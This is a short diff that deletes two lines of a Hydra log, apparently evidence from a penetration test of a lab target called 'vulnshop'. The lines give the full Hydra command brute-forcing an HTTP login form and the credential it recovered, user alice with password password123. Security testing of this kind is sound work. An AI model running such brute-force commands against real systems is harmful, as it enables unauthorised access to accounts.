@@ -1,2 +1,0 @@
-# Hydra v9.6 run at 2025-10-01 08:43:45 on vulnshop http-post-form (hydra -L /home/pentest/users.txt -P /home/pentest/passwords.txt -s 3000 -f -o /home/pentest/evidence/2-3_credential_attacks/hydra_results.txt vulnshop http-post-form /login:username=^USER^&password=^PASS^:Invalid)
-[3000][http-post-form] host: vulnshop   login: alice   password: password123
